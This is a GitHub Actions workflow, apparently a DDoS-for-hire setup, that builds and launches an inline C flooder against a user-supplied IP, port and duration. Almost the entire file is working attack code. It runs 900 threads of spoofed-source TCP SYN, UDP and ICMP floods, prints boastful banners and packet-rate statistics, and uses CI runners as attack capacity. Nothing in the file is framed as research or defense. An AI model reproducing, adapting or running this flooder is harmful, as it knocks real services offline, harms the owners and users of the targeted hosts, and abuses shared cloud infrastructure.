name: OGGY NUCLEAR ATTACK

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        type: string
      target_port:
        description: 'Target Port'
        required: true
        type: string
      attack_duration:
        description: 'Attack Duration (seconds)'
        required: true
        type: string

jobs:
  attack:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout Repository
      uses: actions/checkout@v3
    
    - name: Install Build Tools
      run: |
        sudo apt-get update
        sudo apt-get install -y gcc build-essential
    
    - name: Build Attack Binary
      run: |
        cat > ipx.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_THREADS 900
#define MAX_PACKET_SIZE 65536
#define BURST_SIZE 999

char *target_ip;
int target_port;
int attack_duration;
volatile int attack_running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
        sum += *(unsigned char *)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned int generate_random_ip() {
    return (rand() % 256) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
}

void *tcp_syn_flood(void *arg) {
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in dest;
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return NULL;
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(target_ip);
    
    while (attack_running) {
        memset(packet, 0, MAX_PACKET_SIZE);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = rand() % 65535;
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = generate_random_ip();
        ip->daddr = dest.sin_addr.s_addr;
        
        tcp->source = rand() % 65535;
        tcp->dest = htons(target_port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        ip->check = checksum((unsigned short *)packet, ip->tot_len);
        
        if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            pthread_mutex_lock(&stats_mutex);
            total_packets++;
            total_bytes += ip->tot_len;
            pthread_mutex_unlock(&stats_mutex);
        }
        
        for (int b = 0; b < BURST_SIZE && attack_running; b++) {
            sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest));
            total_packets++;
            total_bytes += ip->tot_len;
        }
    }
    close(sock);
    return NULL;
}

void *udp_flood(void *arg) {
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in dest;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);
    
    while (attack_running) {
        int payload_size = (rand() % 64500) + 1000;
        for (int i = 0; i < payload_size; i++)
            packet[i] = rand() % 255;
        
        sendto(sock, packet, payload_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        pthread_mutex_lock(&stats_mutex);
        total_packets++;
        total_bytes += payload_size;
        pthread_mutex_unlock(&stats_mutex);
        
        for (int b = 0; b < BURST_SIZE && attack_running; b++) {
            sendto(sock, packet, payload_size, 0, (struct sockaddr *)&dest, sizeof(dest));
            total_packets++;
            total_bytes += payload_size;
        }
    }
    close(sock);
    return NULL;
}

void *icmp_flood(void *arg) {
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in dest;
    struct iphdr *ip = (struct iphdr *)packet;
    struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
    
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(target_ip);
    
    while (attack_running) {
        memset(packet, 0, MAX_PACKET_SIZE);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        ip->id = rand() % 65535;
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_ICMP;
        ip->check = 0;
        ip->saddr = generate_random_ip();
        ip->daddr = dest.sin_addr.s_addr;
        
        icmp->type = 8;
        icmp->code = 0;
        icmp->un.echo.id = rand() % 65535;
        icmp->un.echo.sequence = rand() % 65535;
        icmp->checksum = 0;
        icmp->checksum = checksum((unsigned short *)icmp, sizeof(struct icmphdr));
        
        ip->check = checksum((unsigned short *)packet, ip->tot_len);
        
        if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            pthread_mutex_lock(&stats_mutex);
            total_packets++;
            total_bytes += ip->tot_len;
            pthread_mutex_unlock(&stats_mutex);
        }
    }
    close(sock);
    return NULL;
}

void timeout_handler(int signum) {
    attack_running = 0;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔════════════════════════════════════════╗\n");
    printf("║     OGGY NUCLEAR ATTACK ENGINE        ║\n");
    printf("║       900 THREADS - RAW POWER         ║\n");
    printf("╚════════════════════════════════════════╝\n");
    printf("\n");
    
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60\n", argv[0]);
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    
    printf("[+] Target: %s:%d\n", target_ip, target_port);
    printf("[+] Duration: %d seconds\n", attack_duration);
    printf("[+] Threads: %d\n", MAX_THREADS);
    printf("[+] Attack Type: HYBRID (TCP+UDP+ICMP)\n");
    printf("\n");
    
    srand(time(NULL));
    pthread_t threads[MAX_THREADS];
    
    for (int i = 0; i < 300; i++)
        pthread_create(&threads[i], NULL, tcp_syn_flood, NULL);
    for (int i = 300; i < 600; i++)
        pthread_create(&threads[i], NULL, udp_flood, NULL);
    for (int i = 600; i < 900; i++)
        pthread_create(&threads[i], NULL, icmp_flood, NULL);
    
    signal(SIGALRM, timeout_handler);
    alarm(attack_duration);
    
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    
    while (attack_running) {
        sleep(1);
        time_t elapsed = time(NULL) - start;
        
        pthread_mutex_lock(&stats_mutex);
        unsigned long long pps = total_packets - last_packets;
        double mbps = (total_bytes - last_packets * 64) * 8.0 / 1000000.0;
        
        printf("\r[%02ld/%d] PPS: %llu | Speed: %.2f Mbps | Total: %llu pkts | Data: %.2f MB", 
               elapsed, attack_duration, pps, mbps, total_packets, total_bytes / 1048576.0);
        fflush(stdout);
        
        last_packets = total_packets;
        pthread_mutex_unlock(&stats_mutex);
        
        if (elapsed >= attack_duration)
            attack_running = 0;
    }
    
    printf("\n\n");
    printf("╔════════════════════════════════════════╗\n");
    printf("║         ATTACK COMPLETED              ║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║ Total Packets: %llu\n", total_packets);
    printf("║ Total Data: %.2f GB\n", total_bytes / 1073741824.0);
    printf("║ Avg PPS: %llu\n", total_packets / attack_duration);
    printf("╚════════════════════════════════════════╝\n");
    printf("\n");
    
    return 0;
}
EOF
        
        gcc -O3 -pthread -o ipx ipx.c
        chmod +x ipx
    
    - name: Launch Attack
      run: |
        echo ""
        echo "🔥🔥🔥 OGGY ATTACK STARTED 🔥🔥🔥"
        echo "==================================="
        echo "🎯 TARGET: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
        echo "⏱️  TIME: ${{ inputs.attack_duration }} seconds"
        echo "⚡ THREADS: 900"
        echo "==================================="
        echo ""
        
        sudo ./ipx ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.attack_duration }}
        
        echo ""
        echo "==================================="
        echo "✅ ATTACK COMPLETED SUCCESSFULLY"
        echo "💀 CHUMT KA DARINDA STRIKES AGAIN"
        echo "==================================="
    
    - name: Upload Logs
      if: always()
      uses: actions/upload-artifact@v3
      with:
        name: attack-logs
        path: |
          /tmp/*.log
